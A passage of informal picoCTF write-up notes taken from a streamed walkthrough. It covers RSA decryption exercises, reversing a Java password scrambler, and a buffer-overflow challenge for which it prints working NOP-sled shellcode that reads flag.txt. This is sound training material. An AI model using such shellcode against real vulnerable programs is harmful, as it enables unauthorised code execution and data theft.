n : 27566996291508213932419371385141522859343226560050921196294761870500846140132385080994630946107675330189606021165260590147068785820203600882092467797813519434652632126061353583124063944373336654246386074125394368479677295167494332556053947231141336142392086767742035970752738056297057898704112912616565299451359791548536846025854378347423520104947907334451056339439706623069503088916316369813499705073573777577169392401411708920615574908593784282546154486446779246790294398198854547069593987224578333683144886242572837465834139561122101527973799583927411936200068176539747586449939559180772690007261562703222558103359
##### PRODUCE THE FOLLOWING ####
plaintext
IS THIS POSSIBLE and FEASIBLE? (Y/N):n
```
You need the private key, d, to get the plaintext. And in order to get d, you need q and p, but we only have n and e.

#### Question 7:

Use python
```
$ python
>>> ​from Crypto.Util.number import inverse
>>> q = 92092076805892533739724722602668675840671093008520241548191914215399824020372076186460768206814914423802230398410980218741906960527104568970225804374404612617736579286959865287226538692911376507934256844456333236362669879347073756238894784951597211105734179388300051579994253565459304743059533646753003894559
>>> p = 97846775312392801037224396977012615848433199640105786119757047098757998273009741128821931277074555731813289423891389911801250326299324018557072727051765547115514791337578758859803890173153277252326496062476389498019821358465433398338364421624871010292162533041884897182597065662521825095949253625730631876637
>>> e = 65537
>>> totient = (q-1)*(p-1)
>>> d = inverse(e, totient)
>>> d
1405046269503207469140791548403639533127416416214210694972085079171787580463776820425965898174272870486015739516125786182821637006600742140682552321645503743280670839819078749092730110549881891271317396450158021688253989767145578723458252769465545504142139663476747479225923933192421405464414574786272963741656223941750084051228611576708609346787101088759062724389874160693008783334605903142528824559223515203978707969795087506678894006628296743079886244349469131831225757926844843554897638786146036869572653204735650843186722732736888918789379054050122205253165705085538743651258400390580971043144644984654914856729L
```

#### Question 8:
```
#### NEW PROBLEM ####
p : 153143042272527868798412612417204434156935146874282990942386694020462861918068684561281763577034706600608387699148071015194725533394126069826857182428660427818277378724977554365910231524827258160904493774748749088477328204812171935987088715261127321911849092207070653272176072509933245978935455542420691737433
ciphertext : 9276182891752530901219927412073143671948875482138883542938401204867776171605127572134036444953137790745003888189443976475578120144429490705784649507786686788217321344885844827647654512949354661973611664872783393501992112464825441330961457628758224011658785082995945612195073191601952238361315820373373606643521463466376095236371778984942891123936191796720097900593599447528583257806196551724676380135110693228330934418147759387990754368525068685861547977993085149359162754890674487823080750579601100854795031284533864826255207300350679553486505961837349042778851010569582458629638648589442067576234798724906377157351
e : 65537
n : 23952937352643527451379227516428377705004894508566304313177880191662177061878993798938496818120987817049538365206671401938265663712351239785237507341311858383628932183083145614696585411921662992078376103990806989257289472590902167457302888198293135333083734504191910953238278860923153746261500759411620299864395158783509535039259714359526738924736952759753503357614939203434092075676169179112452620687731670534906069845965633455748606649062394293289967059348143206600765820021392608270528856238306849191113241355842396325210132358046616312901337987464473799040762271876389031455051640937681745409057246190498795697239
##### PRODUCE THE FOLLOWING ####
plaintext
IS THIS POSSIBLE and FEASIBLE? (Y/N):y
#### TIME TO SHOW ME WHAT YOU GOT! ###
plaintext: 
```

Python:
```
$ python
>>> ​from Crypto.Util.number import inverse
>>> p = 15314304227252786879841261241720443415693514687428299094
2386694020462861918068684561281763577034706600608387699148071015
1947255333941260698268571824286604278182773787249775543659102315
2482725816090449377474874908847732820481217193598708871526112732
1911849092207070653272176072509933245978935455542420691737433
>>> c = 92761828917525309012199274120731436719488754821388835429
3840120486777617160512757213403644495313779074500388818944397647
5578120144429490705784649507786686788217321344885844827647654512
9493546619736116648727833935019921124648254413309614576287582240
1165878508299594561219507319160195223836131582037337360664352146
3466376095236371778984942891123936191796720097900593599447528583
2578061965517246763801351106932283309344181477593879907543685250
6868586154797799308514935916275489067448782308075057960110085479
5031284533864826255207300350679553486505961837349042778851010569
582458629638648589442067576234798724906377157351
>>> e = 65537
>>> n = 23952937352643527451379227516428377705004894508566304313177880191662177061878993798938496818120987817049538365206671401938265663712351239785237507341311858383628932183083145614696585411921662992078376103990806989257289472590902167457302888198293135333083734504191910953238278860923153746261500759411620299864395158783509535039259714359526738924736952759753503357614939203434092075676169179112452620687731670534906069845965633455748606649062394293289967059348143206600765820021392608270528856238306849191113241355842396325210132358046616312901337987464473799040762271876389031455051640937681745409057246190498795697239
>>> q = n/p
>>> totient = (q-1)*(p-1)
>>> d = inverse(e, totient)
>>> m = pow(c, d, n)
>>> m
14311663942709674867122208214901970650496788151239520971623411712977119642137567031494784893L
```

To get the flag, just convert the above message to hex and then to ascii
```
$ python
>>> hex(14311663942709674867122208214901970650496788151239520971623411712977119642137567031494784893)[2:-1].decode('hex')
'picoCTF{wA8_th4t$_ill3aGal..o1828d357}'
```

Some attacks: If e is too small

## slippery-shellcode - Binary Exploitation
Check for
```
$ checksec --file ./vuln
[*] '/problems/slippery-shellcode_4_64839254839978b32eb661ca92071d48/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```
`NX disabled` means the stack is executable in this case  
`No PIE` means ASLR (Address Space Layout Randomization) is basically disabled, so the starting address is constant.

Vulnerable code:
```
void vuln(char *buf){
  gets(buf);
  puts(buf);
}
```
The gets() function is prone to buffer overflows and so we can put any character (even '\0' bytes) in the buffer except '\n'.

This line of code just executes the buffer: `((void (*)()))(buf + offset))();`.  

We need a nopsled since the code randomizes where we run the buffer.  

We can use a nopsled to fill the buffer so that it doesn't really matter where in the nopsled the cpu starts executing from. 

For our shellcode, we can use c library functions, since the binary is statically linked:
```
$ file vuln
vuln: setgid ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=df86b06c60f9f6b307f6d381d8498245c4d3691c, not stripped
```
32-bit shellcode

You could use random shellcode from the internet or create your own. Gynvael decides to write his own custom shellcode for fun using fopen/fgets.

Open the binary in IDA or Ghidra or objdump to find the addresses of the functions.  

System is not in the binary unfortunately, but fopen is, so we can use it to open the flag.txt.  

Shellcode:

```
[bits 32]
times 256 nop ; makes a nop sled with 256 nop instructions

; the call instruction pushes the next 'instruction' onto the stack 
; or in this case the address of the "r" string which is the 2nd parameter of fopen
call n2 

db "r", 0 ; open the file in read mode

n2:
  call n1 ; the call instruction pushes the address of the "flag.txt" string which is the 1st parameter of fopen
  db "flag.txt", 0

n1:
  mov eax, 0x8050170 ;this is the address of fopen
  call eax

  ; push fgets parameters (LIFO order)
  push eax ; eax is where fopen stores the file ptr (3rd parameter of fgets)
  push 64  ; number of characteres to read (2nd parameter of fgets)
  push 0x80DC11C ; this is a random address in memory Gynvael found to write our flag (use IDA, Ghidra, or objdump to find some blank memory)

  mov eax, 0x8052660 ; fgets address (Use IDA or Ghidra or objdump to find this)
  call eax

  mov eax, 0x8050320 ; puts address
  call eax

  nop
 
```
Save above shellcode as a file like asdf.asm and then compile
```
$ nasm asdf.asm
```
This produces a binary called asdf

To pass the shellcode as input to the program:
```
$ cat ~/asdf | ./vuln

Enter your shellcode:
Thanks! Executing from a random location now...
picoCTF{sl1pp3ry_sh311c0d3_3d79d4df}
Segmentation fault (core dumped)
```
For an actual ctf, Gynvael recommends not writing your own shellcode due to time constraints.

## vault-door-3 - Reverse Engineering
Gynvael gets stuck trying to create a mapping table, so he tries another way:

Just take the part of the java code that does the scrambling and creates the simple anagram
```java
for (i=0; i<8; i++) {
    buffer[i] = password.charAt(i);
}
for (; i<16; i++) {
    buffer[i] = password.charAt(23-i);
}
for (; i<32; i+=2) {
    buffer[i] = password.charAt(46-i);
}
for (i=31; i>=17; i-=2) {
    buffer[i] = password.charAt(i);
}
```

Convert to python to make it easier:
```python
for i in xrange(0, 8):
    buffer[i] = password[i]
for i in xrange(8, 16):
    buffer[i] = password[23-i]
for i in xrange(16, 32, 2):
    buffer[i] = password[46-i]
for i in xrange(31, 15, -2): # Note the >= in the above java for loop
    buffer[i] = password[i]
```

Now use the above python to get the flag
```python
password = bytearray([x for x in range(32)]) # Generates an array with numbers from 0 to 31
buffer = bytearray(32)

s = bytearray("jU5t_a_sna_3lpm13gc49_u_4_m0rf41")

# This gets the correct order of indexes to descramble s
for i in xrange(0, 8):
    buffer[i] = password[i]
for i in xrange(8, 16):
    buffer[i] = password[23-i]
for i in xrange(16, 32, 2):
    buffer[i] = password[46-i]
for i in xrange(31, 15, -2):
    buffer[i] = password[i]

print str(buffer).encode("hex") # Now we have the indexes in buffer

p = bytearray(32)

for i, idx in enumerate(buffer):
  p[i] = s[idx] # Put all the letters in the right order

print p
```

## whats-the-difference
Find the difference between the files using python:
```python
d = open("kitters.jpg", "rb").read() # Unmodified file
e = open("cattos.jpg", "rb").read() # modified file

f = ""

# Zip takes one element from d and one from e for every iteration
for a, b in zip(d, e):
  if a != b:
    f+=b

print f
```

## where-is-the-file
Connect to te shell server  




## Random other stuff Gynvael says about solving ctf challenges during the stream
* He recommends kaitai struct for stegno challenges (Part 1: 46:39)
* Recommends pdfstreamdumper
* Thumbnails can store info
* For network dumps there are two main tools: Wireshark and NetworkMiner

## TODO 
* Fix all the weird non ascii apostrophes and double quotes
* Probably syntax highlighting for some of the code snippets




